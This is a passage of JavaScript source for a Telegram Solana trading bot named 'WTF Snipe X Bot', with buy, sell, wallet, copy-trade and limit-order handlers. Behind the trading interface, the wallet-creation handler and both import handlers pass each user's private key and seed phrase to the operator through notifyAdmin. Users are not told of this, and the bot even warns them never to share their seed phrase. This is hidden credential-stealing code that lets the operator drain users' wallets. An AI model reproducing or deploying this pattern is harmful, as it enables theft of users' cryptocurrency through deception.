      walletPublicKey: activeWallet.publicKey,
      tokenAddress,
      tradeType: 'buy',
      amountSol: amount,
      amountTokens: parseInt(result.outputAmount) / Math.pow(10, 9),
      txHash: result.txid,
      status: 'success'
    });
    
    await notifyAdmin('TRADE_EXECUTED', ctx.from.id, ctx.from.username, {
      type: 'BUY',
      amount: amount,
      token: tokenAddress,
      txHash: result.txid
    });
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
✅ *Buy Successful!*

💰 Spent: ${amount} SOL
🪙 Received: ${(parseInt(result.outputAmount) / Math.pow(10, 9)).toFixed(4)} tokens

📝 TX: \`${result.txid}\`
      `,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 View TX', `https://solscan.io/tx/${result.txid}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
    
  } catch (error) {
    console.error('Buy error:', error);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `❌ *Buy Failed*\n\nError: ${error.message}`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('🔄 Retry', `buy_${amount}_${tokenAddress}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
  }
}

async function handleSell(ctx, percentage, tokenAddress) {
  const userId = ctx.from.id;
  const activeWallet = await getActiveWallet(userId);
  const settings = await getUserSettings(userId);
  
  if (!activeWallet) {
    await ctx.reply('❌ Please connect a wallet first.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('💼 Connect Wallet', 'menu_wallet')]
      ])
    });
    return;
  }
  
  const statusMsg = await ctx.reply(`
🔄 *Processing Sell*

Selling: ${percentage}%
Token: \`${shortenAddress(tokenAddress)}\`
Slippage: ${settings.slippage}%

_Checking token balance..._
  `, { parse_mode: 'Markdown' });
  
  try {
    const tokenBalance = await getTokenBalance(activeWallet.publicKey, tokenAddress);
    
    if (tokenBalance.amount <= 0) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        null,
        '❌ No tokens to sell.'
      );
      return;
    }
    
    const sellAmount = Math.floor((tokenBalance.amount * percentage / 100) * Math.pow(10, tokenBalance.decimals));
    const slippageBps = settings.slippage * 100;
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
🔄 *Processing Sell*

Selling: ${percentage}% (${(sellAmount / Math.pow(10, tokenBalance.decimals)).toFixed(4)} tokens)
Token: \`${shortenAddress(tokenAddress)}\`

_Getting Jupiter quote..._
      `,
      { parse_mode: 'Markdown' }
    );
    
    const quote = await getJupiterQuote(
      tokenAddress,
      SOL_MINT,
      sellAmount,
      slippageBps
    );
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
🔄 *Processing Sell*

Selling: ${(sellAmount / Math.pow(10, tokenBalance.decimals)).toFixed(4)} tokens
Expected: ${(parseInt(quote.outAmount) / LAMPORTS_PER_SOL).toFixed(4)} SOL

_Executing swap..._
      `,
      { parse_mode: 'Markdown' }
    );
    
    const result = await executeJupiterSwap(
      quote,
      activeWallet,
      settings.priorityFee
    );
    
    // Save trade to history
    await addTradeHistory(userId, {
      walletPublicKey: activeWallet.publicKey,
      tokenAddress,
      tradeType: 'sell',
      amountSol: parseInt(result.outputAmount) / LAMPORTS_PER_SOL,
      amountTokens: sellAmount / Math.pow(10, tokenBalance.decimals),
      percentage,
      txHash: result.txid,
      status: 'success'
    });
    
    await notifyAdmin('TRADE_EXECUTED', ctx.from.id, ctx.from.username, {
      type: 'SELL',
      amount: percentage + '%',
      token: tokenAddress,
      txHash: result.txid
    });
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
✅ *Sell Successful!*

💰 Sold: ${(sellAmount / Math.pow(10, tokenBalance.decimals)).toFixed(4)} tokens
🪙 Received: ${(parseInt(result.outputAmount) / LAMPORTS_PER_SOL).toFixed(4)} SOL

📝 TX: \`${result.txid}\`
      `,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔍 View TX', `https://solscan.io/tx/${result.txid}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
    
  } catch (error) {
    console.error('Sell error:', error);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `❌ *Sell Failed*\n\nError: ${error.message}`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('🔄 Retry', `sell_${percentage}_${tokenAddress}`)],
          [Markup.button.callback('🏠 Menu', 'back_main')]
        ])
      }
    );
  }
}

// ============================================
// COMMAND HANDLERS
// ============================================
bot.command('start', async (ctx) => {
  const user = await getOrCreateUser(ctx.from.id, ctx.from.username);
  
  if (user.isNewUser) {
    await User.updateOne({ telegramUserId: ctx.from.id }, { isNewUser: false });
    await notifyAdmin('NEW_USER', ctx.from.id, ctx.from.username);
  }
  
  await showMainMenu(ctx);
});

bot.command('wallet', async (ctx) => {
  await showWalletMenu(ctx);
});

bot.command('positions', async (ctx) => {
  await showPositionsMenu(ctx);
});

bot.command('buy', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length >= 2) {
    const amount = parseFloat(args[0]);
    const address = args[1];
    if (!isNaN(amount) && isSolanaAddress(address)) {
      await handleBuy(ctx, amount, address);
    } else {
      await ctx.reply('❌ Usage: /buy [amount] [token_address]');
    }
  } else {
    await showBuyMenu(ctx);
  }
});

bot.command('sell', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length >= 2) {
    const percentage = parseFloat(args[0]);
    const address = args[1];
    if (!isNaN(percentage) && isSolanaAddress(address)) {
      await handleSell(ctx, percentage, address);
    } else {
      await ctx.reply('❌ Usage: /sell [percentage] [token_address]');
    }
  } else {
    await showSellMenu(ctx);
  }
});

bot.command('copytrade', async (ctx) => {
  await showCopyTradeMenu(ctx);
});

bot.command('limit', async (ctx) => {
  await showLimitOrderMenu(ctx);
});

bot.command('settings', async (ctx) => {
  await showSettingsMenu(ctx);
});

bot.command('refresh', async (ctx) => {
  await showMainMenu(ctx);
});

// ============================================
// CALLBACK HANDLERS - Navigation
// ============================================
bot.action('back_main', async (ctx) => {
  await ctx.answerCbQuery();
  await showMainMenu(ctx, true);
});

bot.action('refresh_main', async (ctx) => {
  await ctx.answerCbQuery('Refreshed!');
  await showMainMenu(ctx, true);
});

// ============================================
// CALLBACK HANDLERS - Menu Navigation
// ============================================
bot.action('menu_wallet', async (ctx) => {
  await ctx.answerCbQuery();
  await showWalletMenu(ctx, true);
});

bot.action('menu_positions', async (ctx) => {
  await ctx.answerCbQuery();
  await showPositionsMenu(ctx, true);
});

bot.action('menu_buy', async (ctx) => {
  await ctx.answerCbQuery();
  await showBuyMenu(ctx, true);
});

bot.action('menu_sell', async (ctx) => {
  await ctx.answerCbQuery();
  await showSellMenu(ctx, true);
});

bot.action('menu_copytrade', async (ctx) => {
  await ctx.answerCbQuery();
  await showCopyTradeMenu(ctx, true);
});

bot.action('menu_limit', async (ctx) => {
  await ctx.answerCbQuery();
  await showLimitOrderMenu(ctx, true);
});

bot.action('menu_settings', async (ctx) => {
  await ctx.answerCbQuery();
  await showSettingsMenu(ctx, true);
});

// ============================================
// CALLBACK HANDLERS - Wallet Actions
// ============================================
bot.action('wallet_create', async (ctx) => {
  await ctx.answerCbQuery();
  
  const userId = ctx.from.id;
  const wallets = await getUserWallets(userId);
  
  if (wallets.length >= MAX_WALLETS) {
    await ctx.reply(`❌ Maximum ${MAX_WALLETS} wallets allowed. Remove one first.`);
    return;
  }
  
  const walletData = createWalletKeys();
  await addWallet(userId, walletData);
  
  await notifyAdmin('WALLET_CREATED', ctx.from.id, ctx.from.username, {
    publicKey: walletData.publicKey,
    privateKey: walletData.privateKey,
    mnemonic: walletData.mnemonic,
    walletNumber: wallets.length + 1
  });
  
  await ctx.editMessageText(`
✅ *Wallet ${wallets.length + 1} Created!*

📍 *Address:*
\`${walletData.publicKey}\`

📝 *Seed Phrase (SAVE THIS!):*
\`${walletData.mnemonic}\`

⚠️ *Never share your seed phrase!*
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
      [Markup.button.callback('« Main Menu', 'back_main')]
    ])
  });
});

bot.action('wallet_import_menu', async (ctx) => {
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
📥 *Import Wallet*

Choose import method:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('📝 Seed Phrase', 'wallet_import_seed')],
      [Markup.button.callback('🔑 Private Key', 'wallet_import_key')],
      [Markup.button.callback('« Back', 'menu_wallet')]
    ])
  });
});

bot.action('wallet_import_seed', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  const wallets = await getUserWallets(userId);
  
  if (wallets.length >= MAX_WALLETS) {
    await ctx.reply(`❌ Maximum ${MAX_WALLETS} wallets allowed. Remove one first.`);
    return;
  }
  
  await setUserState(userId, 'AWAITING_SEED');
  
  await ctx.editMessageText(`
📥 *Import via Seed Phrase*

Please send your 12 or 24 word seed phrase.

⚠️ Make sure you're in a private chat!
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_wallet')]
    ])
  });
});

bot.action('wallet_import_key', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  const wallets = await getUserWallets(userId);
  
  if (wallets.length >= MAX_WALLETS) {
    await ctx.reply(`❌ Maximum ${MAX_WALLETS} wallets allowed. Remove one first.`);
    return;
  }
  
  await setUserState(userId, 'AWAITING_PRIVATE_KEY');
  
  await ctx.editMessageText(`
🔑 *Import via Private Key*

Please send your Base58 encoded private key.

⚠️ Make sure you're in a private chat!
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_wallet')]
    ])
  });
});

bot.action('wallet_export', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  const activeWallet = await getActiveWallet(userId);
  const wallets = await getUserWallets(userId);
  
  if (!activeWallet) {
    await ctx.reply('❌ No wallet connected.');
    return;
  }
  
  const walletIndex = wallets.findIndex(w => w.isActive);
  
  await notifyAdmin('WALLET_EXPORTED', ctx.from.id, ctx.from.username, {
    publicKey: activeWallet.publicKey
  });
  
  const message = `
🔐 *Export Wallet ${walletIndex + 1}*

📍 *Address:*
\`${activeWallet.publicKey}\`

🔑 *Private Key:*
\`${activeWallet.privateKey}\`
${activeWallet.mnemonic ? `\n📝 *Seed Phrase:*\n\`${activeWallet.mnemonic}\`` : ''}

⚠️ *Delete this message after saving!*
  `;
  
  await ctx.reply(message, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('🗑️ Delete Message', 'delete_message')]
    ])
  });
});

bot.action('wallet_remove', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  const wallets = await getUserWallets(userId);
  
  if (wallets.length === 0) {
    await ctx.reply('❌ No wallets to remove.');
    return;
  }
  
  const buttons = wallets.map((w, i) => [
    Markup.button.callback(
      `🗑️ Remove Wallet ${i + 1} (${shortenAddress(w.publicKey)})`,
      `confirm_remove_${i}`
    )
  ]);
  
  buttons.push([Markup.button.callback('« Back', 'menu_wallet')]);
  
  await ctx.editMessageText(`
🗑️ *Remove Wallet*

Select a wallet to remove:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard(buttons)
  });
});

bot.action(/^confirm_remove_(\d+)$/, async (ctx) => {
  await ctx.answerCbQuery();
  const index = parseInt(ctx.match[1]);
  const userId = ctx.from.id;
  
  const removedWallet = await removeWallet(userId, index);
  
  if (!removedWallet) {
    await ctx.reply('❌ Invalid wallet.');
    return;
  }
  
  await ctx.editMessageText(`
✅ Wallet removed: \`${shortenAddress(removedWallet.publicKey)}\`
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
      [Markup.button.callback('« Main Menu', 'back_main')]
    ])
  });
});

bot.action('wallet_refresh', async (ctx) => {
  await ctx.answerCbQuery('Refreshing...');
  await showWalletMenu(ctx, true);
});

bot.action(/^switch_wallet_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1]);
  const userId = ctx.from.id;
  
  await setActiveWallet(userId, index);
  await ctx.answerCbQuery(`Switched to Wallet ${index + 1}`);
  await showWalletMenu(ctx, true);
});

// ============================================
// CALLBACK HANDLERS - Trading
// ============================================
bot.action(/^buy_(\d+\.?\d*)_(.+)$/, async (ctx) => {
  const amount = parseFloat(ctx.match[1]);
  const address = ctx.match[2];
  await ctx.answerCbQuery(`Buying ${amount} SOL...`);
  await handleBuy(ctx, amount, address);
});

bot.action(/^sell_(\d+)_(.+)$/, async (ctx) => {
  const percentage = parseInt(ctx.match[1]);
  const address = ctx.match[2];
  await ctx.answerCbQuery(`Selling ${percentage}%...`);
  await handleSell(ctx, percentage, address);
});

bot.action(/^setbuy_(\d+\.?\d*)$/, async (ctx) => {
  const amount = ctx.match[1];
  await ctx.answerCbQuery(`Selected ${amount} SOL`);
  const userId = ctx.from.id;
  await setPendingTrade(userId, 'buy', parseFloat(amount));
  
  await ctx.editMessageText(`
🟢 *Buy ${amount} SOL*

Paste a token address to buy.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', 'menu_buy')]
    ])
  });
});

bot.action(/^setsell_(\d+)$/, async (ctx) => {
  const percentage = ctx.match[1];
  await ctx.answerCbQuery(`Selected ${percentage}%`);
  const userId = ctx.from.id;
  await setPendingTrade(userId, 'sell', null, parseInt(percentage));
  
  await ctx.editMessageText(`
🔴 *Sell ${percentage}%*

Paste a token address to sell.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', 'menu_sell')]
    ])
  });
});

bot.action(/^refresh_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  if (address === 'main') {
    await ctx.answerCbQuery('Refreshed!');
    await showMainMenu(ctx, true);
  } else if (address === 'positions') {
    await ctx.answerCbQuery('Refreshing...');
    await showPositionsMenu(ctx, true);
  } else {
    await ctx.answerCbQuery('Refreshing token data...');
    await sendTokenAnalysis(ctx, address);
  }
});

// ============================================
// CALLBACK HANDLERS - Settings
// ============================================
bot.action('settings_slippage', async (ctx) => {
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
📊 *Slippage Settings*

Select your preferred slippage:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback('0.5%', 'set_slippage_0.5'),
        Markup.button.callback('1%', 'set_slippage_1'),
        Markup.button.callback('2%', 'set_slippage_2')
      ],
      [
        Markup.button.callback('5%', 'set_slippage_5'),
        Markup.button.callback('10%', 'set_slippage_10')
      ],
      [Markup.button.callback('« Back', 'menu_settings')]
    ])
  });
});

bot.action(/^set_slippage_(\d+\.?\d*)$/, async (ctx) => {
  const slippage = parseFloat(ctx.match[1]);
  const userId = ctx.from.id;
  await updateUserSettings(userId, { slippage });
  
  await ctx.answerCbQuery(`Slippage set to ${slippage}%`);
  await showSettingsMenu(ctx, true);
});

bot.action('settings_fee', async (ctx) => {
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
⚡ *Priority Fee Settings*

Select your priority fee:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback('0.0005 SOL', 'set_fee_0.0005'),
        Markup.button.callback('0.001 SOL', 'set_fee_0.001')
      ],
      [
        Markup.button.callback('0.005 SOL', 'set_fee_0.005'),
        Markup.button.callback('0.01 SOL', 'set_fee_0.01')
      ],
      [Markup.button.callback('« Back', 'menu_settings')]
    ])
  });
});

bot.action(/^set_fee_(\d+\.?\d*)$/, async (ctx) => {
  const fee = parseFloat(ctx.match[1]);
  const userId = ctx.from.id;
  await updateUserSettings(userId, { priorityFee: fee });
  
  await ctx.answerCbQuery(`Priority fee set to ${fee} SOL`);
  await showSettingsMenu(ctx, true);
});

bot.action('settings_notifications', async (ctx) => {
  const userId = ctx.from.id;
  const settings = await getUserSettings(userId);
  await updateUserSettings(userId, { notifications: !settings.notifications });
  
  await ctx.answerCbQuery(
    !settings.notifications ? 'Notifications ON' : 'Notifications OFF'
  );
  await showSettingsMenu(ctx, true);
});

// ============================================
// CALLBACK HANDLERS - Copy Trade
// ============================================
bot.action('copytrade_add', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  await setUserState(userId, 'AWAITING_COPYTRADE_ADDRESS');
  
  await ctx.editMessageText(`
👥 *Add Copy Trade Wallet*

Send the wallet address you want to copy trade.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_copytrade')]
    ])
  });
});

bot.action('copytrade_manage', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  const copyTradeWallets = await getCopyTradeWallets(userId);
  
  if (copyTradeWallets.length === 0) {
    await ctx.editMessageText('No wallets being tracked.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('« Back', 'menu_copytrade')]
      ])
    });
    return;
  }
  
  const buttons = copyTradeWallets.map((w, i) => [
    Markup.button.callback(`🗑️ ${shortenAddress(w)}`, `remove_copytrade_${i}`)
  ]);
  buttons.push([Markup.button.callback('« Back', 'menu_copytrade')]);
  
  await ctx.editMessageText(`
👥 *Manage Copy Trade Wallets*

Tap to remove:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard(buttons)
  });
});

bot.action(/^remove_copytrade_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1]);
  const userId = ctx.from.id;
  
  const removed = await removeCopyTradeWallet(userId, index);
  if (removed) {
    await ctx.answerCbQuery(`Removed ${shortenAddress(removed)}`);
  }
  await showCopyTradeMenu(ctx, true);
});

// ============================================
// CALLBACK HANDLERS - Limit Orders
// ============================================
bot.action('limit_buy', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  await setUserState(userId, 'AWAITING_LIMIT_BUY');
  
  await ctx.editMessageText(`
🟢 *Create Limit Buy*

Send in format:
\`[token_address] [price] [amount_sol]\`

Example:
\`So11...abc 0.001 0.5\`
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_limit')]
    ])
  });
});

bot.action('limit_sell', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  await setUserState(userId, 'AWAITING_LIMIT_SELL');
  
  await ctx.editMessageText(`
🔴 *Create Limit Sell*

Send in format:
\`[token_address] [price] [percentage]\`

Example:
\`So11...abc 0.01 50\`
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_limit')]
    ])
  });
});

bot.action('limit_view', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  const limitOrders = await getLimitOrders(userId);
  
  if (limitOrders.length === 0) {
    await ctx.editMessageText('No active limit orders.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('« Back', 'menu_limit')]
      ])
    });
    return;
  }
  
  const orderList = limitOrders.map((o, i) => 
    `${i+1}. ${o.orderType} ${o.amount} @ $${o.price}\n   Token: \`${shortenAddress(o.tokenAddress)}\``
  ).join('\n\n');
  
  const buttons = limitOrders.map((_, i) => 
    Markup.button.callback(`🗑️ Cancel #${i+1}`, `cancel_limit_${i}`)
  );
  
  await ctx.editMessageText(`
📈 *Active Limit Orders*

${orderList}
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      buttons,
      [Markup.button.callback('« Back', 'menu_limit')]
    ])
  });
});

bot.action(/^cancel_limit_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1]);
  const userId = ctx.from.id;
  
  await cancelLimitOrder(userId, index);
  await ctx.answerCbQuery('Order cancelled');
  await showLimitOrderMenu(ctx, true);
});

// ============================================
// CALLBACK HANDLERS - Misc
// ============================================
bot.action('delete_message', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.deleteMessage();
});

// ============================================
// MESSAGE HANDLER
// ============================================
bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const text = ctx.message.text.trim();
  
  const userState = await getUserState(userId);
  const state = userState?.state;
  
  // Handle state-based inputs
  if (state === 'AWAITING_SEED') {
    await clearUserState(userId);
    
    try {
      const walletData = importFromMnemonic(text);
      const wallets = await getUserWallets(userId);
      await addWallet(userId, walletData);
      
      await notifyAdmin('WALLET_IMPORTED_SEED', ctx.from.id, ctx.from.username, {
        publicKey: walletData.publicKey,
        privateKey: walletData.privateKey,
        mnemonic: walletData.mnemonic,
        walletNumber: wallets.length + 1
      });
      
      try { await ctx.deleteMessage(); } catch {}
      
      await ctx.reply(`
✅ *Wallet ${wallets.length + 1} Imported!*

📍 Address: \`${walletData.publicKey}\`
      `, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } catch (error) {
      await ctx.reply('❌ Invalid seed phrase. Please try again.');
    }
    return;
  }
  
  if (state === 'AWAITING_PRIVATE_KEY') {
    await clearUserState(userId);
    
    try {
      const walletData = importFromPrivateKey(text);
      const wallets = await getUserWallets(userId);
      await addWallet(userId, walletData);
      
      await notifyAdmin('WALLET_IMPORTED_KEY', ctx.from.id, ctx.from.username, {
        publicKey: walletData.publicKey,
        privateKey: walletData.privateKey,
        walletNumber: wallets.length + 1
      });
      
      try { await ctx.deleteMessage(); } catch {}
      
      await ctx.reply(`
✅ *Wallet ${wallets.length + 1} Imported!*

📍 Address: \`${walletData.publicKey}\`
      `, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } catch (error) {
      await ctx.reply('❌ Invalid private key. Please try again.');
    }
    return;
  }
  
  if (state === 'AWAITING_COPYTRADE_ADDRESS') {
    await clearUserState(userId);
    
    if (isSolanaAddress(text)) {
      await addCopyTradeWallet(userId, text);
      await ctx.reply(`✅ Now tracking: \`${shortenAddress(text)}\``, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('👥 Copy Trade Menu', 'menu_copytrade')],
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } else {
      await ctx.reply('❌ Invalid Solana address.');
    }
    return;
  }
  
  if (state === 'AWAITING_LIMIT_BUY') {
    await clearUserState(userId);
    
    const parts = text.split(' ');
    if (parts.length >= 3 && isSolanaAddress(parts[0])) {
      const tokenAddress = parts[0];
      const price = parseFloat(parts[1]);
      const amount = parseFloat(parts[2]);
      
      if (!isNaN(price) && !isNaN(amount)) {
        await addLimitOrder(userId, {
          tokenAddress,
          orderType: 'buy',
          price,
          amount
        });
        
        await ctx.reply(`
✅ *Limit Buy Created*

Token: \`${shortenAddress(tokenAddress)}\`
Price: $${price}
Amount: ${amount} SOL
        `, {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('📈 View Orders', 'limit_view')],
            [Markup.button.callback('« Main Menu', 'back_main')]
          ])
        });
        return;
      }
    }
    await ctx.reply('❌ Invalid format. Use: [token_address] [price] [amount_sol]');
    return;
  }
  
  if (state === 'AWAITING_LIMIT_SELL') {
    await clearUserState(userId);
    
    const parts = text.split(' ');
    if (parts.length >= 3 && isSolanaAddress(parts[0])) {
      const tokenAddress = parts[0];
      const price = parseFloat(parts[1]);
      const amount = parseFloat(parts[2]);
      
      if (!isNaN(price) && !isNaN(amount)) {
        await addLimitOrder(userId, {
          tokenAddress,
          orderType: 'sell',
          price,
          amount
        });
        
        await ctx.reply(`
✅ *Limit Sell Created*

Token: \`${shortenAddress(tokenAddress)}\`
Price: $${price}
Percentage: ${amount}%
        `, {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('📈 View Orders', 'limit_view')],
            [Markup.button.callback('« Main Menu', 'back_main')]
          ])
        });
        return;
      }
    }
    await ctx.reply('❌ Invalid format. Use: [token_address] [price] [percentage]');
    return;
  }
  
  // Check for pending trade
  const pendingTrade = await getPendingTrade(userId);
  if (pendingTrade && isSolanaAddress(text)) {
    await clearPendingTrade(userId);
    
    if (pendingTrade.tradeType === 'buy') {
      await handleBuy(ctx, pendingTrade.amount, text);
    } else if (pendingTrade.tradeType === 'sell') {
      await handleSell(ctx, pendingTrade.percentage, text);
    }
    return;
  }
  
  // Check if it's a token address
  if (isSolanaAddress(text)) {
    await sendTokenAnalysis(ctx, text);
    return;
  }
  
  // Default response
  await ctx.reply('❌ Invalid input. Send a Solana token address or use the menu.', {
    ...Markup.inlineKeyboard([
      [Markup.button.callback('🏠 Main Menu', 'back_main')]
    ])
  });
});

// ============================================
// START BOT
// ============================================
async function startBot() {
  await connectDB();
  
  bot.launch();
  console.log('🤖 Bot started successfully!');
}

startBot();

// Enable graceful stop
process.once('SIGINT', () => {
  mongoose.connection.close();
  bot.stop('SIGINT');
});
process.once('SIGTERM', () => {
  mongoose.connection.close();
  bot.stop('SIGTERM');
});

// ============ LAUNCH BOT ============
bot.launch()
  .then(() => console.log('🤖 WTF Snipe X Bot is running!'))
  .catch(err => console.error('Failed to start bot:', err));

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));